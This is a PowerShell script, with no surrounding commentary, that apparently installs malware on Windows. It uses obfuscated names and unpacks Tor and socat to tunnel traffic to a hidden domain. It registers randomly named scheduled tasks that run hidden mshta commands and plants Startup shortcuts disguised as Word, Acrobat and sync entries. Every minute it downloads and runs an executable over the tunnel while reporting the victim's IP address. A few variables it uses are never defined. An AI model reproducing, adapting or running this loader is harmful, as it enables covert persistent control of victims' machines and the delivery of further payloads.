$SH_TYPE_SCHEDULED_TASK=1;
$SH_TYPE_TASK_SCHEDULER=2;
$schedulerType=$SH_TYPE_SCHEDULED_TASK;
function Base64ToFile
{
param([string]$file, [string]$string);
$bytes=[System.Convert]::FromBase64String($string);
[IO.File]::WriteAllBytes($file, $bytes);
}
function IgewPfCUf
{
param([string]$zipfile, [string]$destination);
$7z = Join-Path $env:ALLUSERSPROFILE '7za.exe';
if ($(Try { Test-Path $7z.trim() } Catch { $false })){
Start-Process "$7z" -ArgumentList "x -o`"$destination`" -y `"$zipfile`"" -Wait -NoNewWindow
}
else{
$shell = new-object -com shell.application;
$zip = $shell.NameSpace($zipfile);
foreach($item in $zip.items())
{
$shell.Namespace($destination).copyhere($item);
}
}
}

function Add-Shortcut{
    param([string]$target_path, [string]$dest_path, [string]$work_path, [string]$arguments="");
    
    $_path=Split-Path $dest_path;
    if (-Not (Test-Path $_path)){
        mkdir -Force $_path;
    }
    if (-Not (Test-Path $target_path)){
        Write-Output "Can't add shortcut. Target path '$target_path' not found.";
        return;
    }
    if ((Test-Path $dest_path)){
        Write-Output "Can't add shortcut. Destination path '$dest_path' exist.";
        return;
    }

    $_shell = New-Object -ComObject ("WScript.Shell");
    $_shortcut = $_shell.CreateShortcut($dest_path);
    $_shortcut.TargetPath=$target_path;
    if(-Not [String]::IsNullOrEmpty($arguments)){
        $_shortcut.Arguments=$arguments;
    }
    $_shortcut.WorkingDirectory=$work_path;
    $_shortcut.Save();
}

function RandomString{
    param([int]$min=5, [int]$max=15);
    return (-join ((48..57)+(65..90)+(97..122) | Get-Random -Count (Get-Random -minimum $min -maximum $max) | % {[char]$_}));
}
function InitScheduller{
    try{
        Import-Module ScheduledTasks -ErrorAction Stop;
        return $SH_TYPE_SCHEDULED_TASK;
    }catch{
        $File=$env:ALLUSERSPROFILE+'\ts.7z';
        $Dest=$env:ALLUSERSPROFILE+'\'+(RandomString);
        if ((Test-Path $Dest) -eq 1){Remove-Item -Force -Recurse $Dest;}mkdir $Dest | Out-Null;
        IgewPfCUf $File $Dest;
        Remove-Item -Force $File;
        $TSAssembly=$Dest+'\Microsoft.Win32.TaskScheduler.dll';
        $loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
        return $SH_TYPE_TASK_SCHEDULER;
    }
}
function BmruWvxEDIoNRA
{
param([string]$name, [string]$cmd, [string]$params='',[int]$restart=0,[int]$delay=0,[string]$dir='');
switch ($schedulerType) {
    $SH_TYPE_SCHEDULED_TASK {
        try{
            $Action = New-ScheduledTaskAction -Execute $cmd;
            if(-Not [String]::IsNullOrEmpty($params)){
                $Action.Arguments=$params;
            }
            if(-Not [String]::IsNullOrEmpty($dir)){
                $Action.WorkingDirectory=$dir;
            }
            $LogonTrigger = New-ScheduledTaskTrigger -AtLogOn;
            try{
                $LogonTrigger.UserId=$env:username;
            }catch{
                $LogonTrigger.User=$env:username;
            }
            if(-Not $delay -eq 0){
                $LogonTrigger.Delay=New-TimeSpan -Seconds $delay;
            }
            if($restart -eq 1){
                $TimeTrigger = New-ScheduledTaskTrigger -Once -At 12am -RepetitionInterval ([System.TimeSpan]::FromMinutes(1)) -RepetitionDuration ([System.TimeSpan]::FromDays(365 * 20));
            }
            $Settings = New-ScheduledTaskSettingsSet;
            $Settings.DisallowStartIfOnBatteries = $False;
            $Settings.StopIfGoingOnBatteries = $False;
            if($restart -eq 1){
                $Task = Register-ScheduledTask -Action $Action -Trigger $LogonTrigger,$TimeTrigger -Settings $Settings -TaskName $name -Description (RandomString);
            }else{
                $Task = Register-ScheduledTask -Action $Action -Trigger $LogonTrigger -Settings $Settings -TaskName $name -Description (RandomString);
            }
            Start-ScheduledTask -InputObject $Task;
        }catch {
            Write-Error $_ -ErrorAction Continue;
        }
    };
    Default {
        try{
            $ts=New-Object Microsoft.Win32.TaskScheduler.TaskService;
            $td=$ts.NewTask();
            $td.RegistrationInfo.Description = (RandomString);
            $td.Settings.DisallowStartIfOnBatteries = $False;
            $td.Settings.StopIfGoingOnBatteries = $False;
            $td.Settings.MultipleInstances = [Microsoft.Win32.TaskScheduler.TaskInstancesPolicy]::IgnoreNew;
            $LogonTrigger = New-Object Microsoft.Win32.TaskScheduler.LogonTrigger;
            $LogonTrigger.StartBoundary=[System.DateTime]::Now;
            $LogonTrigger.UserId=$env:username;
            $LogonTrigger.Delay=[System.TimeSpan]::FromSeconds($delay);
            $td.Triggers.Add($LogonTrigger);
            if($restart -eq 1){
            $TimeTrigger = New-Object Microsoft.Win32.TaskScheduler.TimeTrigger;
            $TimeTrigger.StartBoundary=[System.DateTime]::Now;
            $TimeTrigger.Repetition.Interval=[System.TimeSpan]::FromMinutes(1);
            $TimeTrigger.Repetition.StopAtDurationEnd=$False;
            $td.Triggers.Add($TimeTrigger);
            }
            $tsf="Microsoft.Win32.TaskScheduler";
            $ExecAction=New-Object "$tsf.ExecAction"($cmd,$params,$dir);
            $td.Actions.Add($ExecAction);
            $task=$ts.RootFolder.RegisterTaskDefinition($name, $td);
            $task.Run();
        }catch {
            Write-Error $_ -ErrorAction Continue;
        }
    };
}
}
function uPFITobIk{
$schedulerType = InitScheduller;
$tf=$env:ALLUSERSPROFILE+'\tor-win32-0.3.3.9.7z';
$DestTP=$env:ALLUSERSPROFILE+'\'+(RandomString);
if ((Test-Path $DestTP) -eq 1){Remove-Item -Force -Recurse $DestTP;}mkdir $DestTP | Out-Null;
IgewPfCUf $tf $DestTP;
Remove-Item -Force $tf;
$ulpNPMidu=$DestTP+'\Tor\';
$UNnYtHxrOZVK="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"tor.exe`",0,False))";
BmruWvxEDIoNRA (RandomString) 'mshta.exe' $UNnYtHxrOZVK 0 0 $ulpNPMidu;

Add-Shortcut "$([System.Environment]::SystemDirectory)\mshta.exe" "$([System.Environment]::GetFolderPath('Startup'))\msword.lnk" $vzfkFcawDbIUSya $toawwyJljC

$IOTuhLvm=$env:ALLUSERSPROFILE+'\socat-windows-1.7.2.1.7z';
$ZfPpnOsIwMP=(RandomString);
IgewPfCUf $IOTuhLvm $DestTP;
$mXULIpHUVBrEYif=$DestTP+'\socat-windows-1.7.2.1\';
Rename-Item -path $mXULIpHUVBrEYif -newName $ZfPpnOsIwMP;
$eyj=$DestTP+'\'+$ZfPpnOsIwMP+'\';
Remove-Item -Force $IOTuhLvm;
$s1cmd='socat tcp4-LISTEN:5070,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:80,socksport=9050';
$s2cmd='socat tcp4-LISTEN:5588,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:5588,socksport=9050';
$rFCeOtJGkZyN="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s1cmd`",0,False))";
$hxNmZso="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s2cmd`",0,False))";
BmruWvxEDIoNRA (RandomString) 'mshta.exe' $rFCeOtJGkZyN 0 0 $eyj;
BmruWvxEDIoNRA (RandomString) 'mshta.exe' $hxNmZso 0 0 $eyj;

Add-Shortcut "$([System.Environment]::SystemDirectory)\mshta.exe" "$([System.Environment]::GetFolderPath('Startup'))\acrobat.lnk" $eyj $rFCeOtJGkZyN
Add-Shortcut "$([System.Environment]::SystemDirectory)\mshta.exe" "$([System.Environment]::GetFolderPath('Startup'))\sync.lnk" $eyj $hxNmZso

$pRIhb="vbsc"+"ript:close(CreateObject(`"WScript.Shell`").Run(`"powershell.exe `"`"`$F=`$env:Temp+'\\"+(RandomString)+".exe';rm -Force `$F;`$cl=(New-Object Net.WebClient);`$cl.DownloadFile('http://127.0.0.1:5555/"+(RandomString)+".asp?ts&ip='+`$cl.Download`"+`"String('http://api.ipify.org/'),`$F);& `$F`"`"`",0,False))";
BmruWvxEDIoNRA (RandomString) 'mshta.exe' $pRIhb 1;
#Set directory permissions
$Rights = "Read, ReadAndExecute, ListDirectory";
$acl = Get-Acl $MwFU;
$acl|Select -expand Access|ForEach-Object {
    $perm = $_.IdentityReference, $Rights, $_.InheritanceFlags, $_.PropagationFlags, "Allow";
    $rule = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $perm;
    $acl.SetAccessRule($rule);
}
$acl.SetAccessRuleProtection($True, $False);
$acl | Set-Acl -Path $MwFU;
}
uPFITobIk;
